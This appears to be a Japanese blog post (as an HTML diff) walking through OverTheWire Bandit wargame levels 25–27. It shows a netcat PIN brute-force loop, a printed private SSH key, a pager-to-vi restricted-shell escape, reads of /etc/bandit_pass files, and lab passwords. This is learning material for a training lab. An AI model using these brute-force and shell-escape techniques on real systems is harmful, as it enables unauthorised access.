@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="ja">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Level 25 Goal  A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+  デーモンがポート30002でlisten状態 このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る ピンコードはブルートフォースでしか調べることはできない  resolve bandit24@bandit:~$ mkdir /tmp/shell bandit24@bandit:~$ cd /tmp/shell bandit24@bandit:/tmp/shell$ vim make-password-code.sh #!/bin/bash for i in {0000.'><title>【OverTheWire奮闘記】Bandit: Level25〜27</title>
+
+<link rel='canonical' href='https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='【OverTheWire奮闘記】Bandit: Level25〜27'>
+<meta property='og:description' content='Level 25 Goal  A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+  デーモンがポート30002でlisten状態 このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る ピンコードはブルートフォースでしか調べることはできない  resolve bandit24@bandit:~$ mkdir /tmp/shell bandit24@bandit:~$ cd /tmp/shell bandit24@bandit:/tmp/shell$ vim make-password-code.sh #!/bin/bash for i in {0000.'>
+<meta property='og:url' content='https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/'>
+<meta property='og:site_name' content='ただくんぶろぐ'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-06-28T21:29:30&#43;09:00'/><meta property='article:modified_time' content='2021-06-28T21:29:30&#43;09:00'/>
+<meta name="twitter:title" content="【OverTheWire奮闘記】Bandit: Level25〜27">
+<meta name="twitter:description" content="Level 25 Goal  A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+  デーモンがポート30002でlisten状態 このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る ピンコードはブルートフォースでしか調べることはできない  resolve bandit24@bandit:~$ mkdir /tmp/shell bandit24@bandit:~$ cd /tmp/shell bandit24@bandit:/tmp/shell$ vim make-password-code.sh #!/bin/bash for i in {0000.">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://tadakun8.github.io">ただくんぶろぐ</a></h1>
+        <h2 class="site-description">技術ブログはじめました</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://tadakun8.github.io" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/overthewire/" >
+                OverTheWire
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/over-the-wire/bandit/level25-27/">【OverTheWire奮闘記】Bandit: Level25〜27</a>
+    </h2>
+
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">2021-06-28</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <h2 id="level-25">Level 25</h2>
+<h3 id="goal">Goal</h3>
+<blockquote>
+<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.</p>
+</blockquote>
+<ul>
+<li>デーモンがポート30002でlisten状態</li>
+<li>このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る</li>
+<li>ピンコードはブルートフォースでしか調べることはできない</li>
+</ul>
+<h3 id="resolve">resolve</h3>
+<pre><code>bandit24@bandit:~$ mkdir /tmp/shell
+bandit24@bandit:~$ cd /tmp/shell
+bandit24@bandit:/tmp/shell$ vim make-password-code.sh
+#!/bin/bash
+
+for i in {0000..9999};
+do
+    echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}&quot;
+done
+bandit24@bandit:/tmp/shell$ chmod +x make-password-code.sh 
+bandit24@bandit:/tmp/shell$ ./make-password-code.sh &gt; combinations.txt
+bandit24@bandit:/tmp/shell$ nc localhost 30002 &lt; combinations.txt 
+.
+.
+.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/shell$ exit
+
+# 以下はローカルで
+$ ssh -l bandit25 -p 2220 bandit.labs.overthewire.org
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit25@bandit.labs.overthewire.org's password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+</code></pre><h3 id="resolveまでにやったこと">resolveまでにやったこと</h3>
+<p>ブルートフォースとは総当たり攻撃のことです。</p>
+<p>以下のシェルを作って対応しました</p>
+<pre><code>#!/bin/bash
+
+for count in {0000..9999};
+do
+    echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${count}&quot; | timeout -s 9 0.8 nc localhost 30002 &gt;&gt; result.txt
+done
+</code></pre><p>・・・ただ、<strong>とても遅い!</strong></p>
+<p>方法は合っていると思いますが、こんなにちんたらしたブルートフォース攻撃は捕まってしまいます笑。</p>
+<p>なので、先人たちの知恵を拝借しました。こちらのサイトが参考になりました。</p>
+<ul>
+<li><a href="https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire">https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire</a></li>
+</ul>
+<p>ぼくのやり方とほぼ同じでしたが、入力値を<code>echo</code>ではなくファイルとして読み込んでいる点が異なる部分です。</p>
+<p>まず、以下のshell(make-password-code.sh)を作り</p>
+<pre><code>#!/bin/bash
+for i in {0000..9999}
+do 
+    echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&quot;
+done
+</code></pre><p>その後、<code>./make-password-code.sh &gt; combinations.txt</code>で全ての組み合わせのファイルを作成してます。その後に<code>nc localhost 30002</code>をしてパスワードを取得しています。</p>
+<p>私は最初、<code>nc</code>を立ち上げて次の入力を行うにはSIGKILLを行うしか方法がないと思っていました。ただ、ファイルを読み込ませることで、ファイルの内容1行ずつ入力するということができると知りました！この方法だと一瞬でパスワードを取得できます。</p>
+<h2 id="level-26">Level 26</h2>
+<h3 id="goal-1">Goal</h3>
+<blockquote>
+<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>
+</blockquote>
+<ul>
+<li>bandit26へログインすることは簡単だが、/bin/bashではない</li>
+<li>それがどのように機能するのかを調べる</li>
+</ul>
+<h3 id="resolve-1">resolve</h3>
+<pre><code>bandit25@bandit:~$ cat bandit26.sshkey 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+bandit25@bandit:~$ exit
+
+# 以下はローカルで
+$ touch ~/.ssh/bandit/bandit26.private.pem
+$ vim ~/.ssh/bandit/bandit26.private.pem
+※ cat bandit26.sshkey の結果を貼り付ける
+$ chmod 600 ~/.ssh/bandit/bandit26.private.pem
+(端末のウィンドウサイズを小さくする)
+$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
+(moreの画面で)
+v
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+</code></pre><h3 id="resolveまでにやったこと-1">resolveまでにやったこと</h3>
+<p><code>ls</code>すると秘密鍵があるので、ローカルへ登録します</p>
+<p>その鍵を指定し、bandit26でログインしようとすると</p>
+<pre><code>$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
+.
+.
+.
+  Enjoy your stay!
+
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to bandit.labs.overthewire.org closed.
+</code></pre><p>でConnectionが切れてしまいました。</p>
+<p>・・・なるほど、ログインシェルが<code>/bin/bash</code>じゃないのか。</p>
+<p>ログインシェルの情報は<code>/etc/passwd</code>に記載があります。ということで、再度bandit25のユーザでログインし、<code>/etc/passwd</code>を見に行きます。</p>
+<pre><code>bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext 
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+</code></pre><p>TERMという環境変数は調べてみると、どうやら端末の種類みたいです</p>
+<ul>
+<li><a href="http://x68000.q-e-d.net/~68user/unix/pickup?TERM">http://x68000.q-e-d.net/~68user/unix/pickup?TERM</a></li>
+</ul>
+<p><code>more ~/text.txt</code>とあるので、bandit26でログインした時には<code>text.txt</code>の値が表示されるようです。そして<code>exit 0</code>で正常しているので、ログインは成功しているのですが、処理が終了します。</p>
+<p>方法としては以下の2つがありましたが、どちらも権限で書き換えられず</p>
+<ol>
+<li>/etc/passwdを書き換えて、bandit26のログインシェルを/bin/bashにする</li>
+<li>/usr/bin/showtextのexit0を消してみる</li>
+</ol>
+<p>詰まってしまったため、回答を見に行きました。今回参考にしたのは以下です。</p>
+<ul>
+<li><a href="https://burakb.net/writeup/overthewire-bandit-level-25-level-26/">https://burakb.net/writeup/overthewire-bandit-level-25-level-26/</a></li>
+</ul>
+<p>・・・なるほど、すごい。なぜ<code>cat</code>ではなく<code>more</code>でテキストを表示させているかを考える必要があったみたいです。<code>more</code>は表示する行数が多くなった場合、ページャーになるというコマンドです。今までは端末を最大にしていたので、そのまま表示されていたのですが、端末のウィンドウサイズをとても小さくし、もう一度sshしてみるとページャーになりました。</p>
+<p>続いて<code>v</code>を押すと<code>vi</code>が起動されます。<code>vi</code>上で<code>:set shell=/bin/bash</code>、<code>:shell</code>と打つとシェルが起動しました！</p>
+<p>まとめると、<code>more</code>にはエディター(今回は<code>vi</code>)を起動することができ、そのエディター経由でシェルを起動する、ということに気づくかどうかがこの問題を解く鍵でした。</p>
+<h2 id="level-27">Level 27</h2>
+<h3 id="goal-2">Goal</h3>
+<blockquote>
+<p>Good job getting a shell! Now hurry and grab the password for bandit27!</p>
+</blockquote>
+<ul>
+<li>シェル取ったらbandit27のパスワードを取得する</li>
+</ul>
+<h3 id="resolve-2">resolve</h3>
+<pre><code>bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+bandit26@bandit:~$ exit
+(viの画面で)
+:q
+
+# 以下はローカルで行う
+$ ssh -l bandit27 -p 2220 bandit.labs.overthewire.org
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27@bandit.labs.overthewire.org's password: 3ba3118a22e93127a4ed485be72ef5ea
+</code></pre><h3 id="resolveまでにやったこと-2">resolveまでにやったこと</h3>
+<p><code>ls</code>すると<code>bandit27-do</code>というスクリプトがあるのでそれを実行しました。スクリプトの使い方は引数なしで実行するとでます。</p>
+<h2 id="おわりに">おわりに</h2>
+<p>ブルートフォースという単語が出てきて、少しセキュリティっぽくなってきました。</p>
+<p>詰まってしまったときにはずーっと取り組み続けて、なんの成果も得られませんでした状態になりました。調べていくうちに色々わかってくるのですが、手が尽きたら諦めて、一度回答を見るというのも選択肢として入れたいです。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level22-24/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level22〜24</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level19-21/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level19〜21</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level16-18/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level16〜18</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level14-15/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level14〜15</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/over-the-wire/bandit/level13/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【OverTheWire奮闘記】Bandit: Level13</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2021 ただくんぶろぐ
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
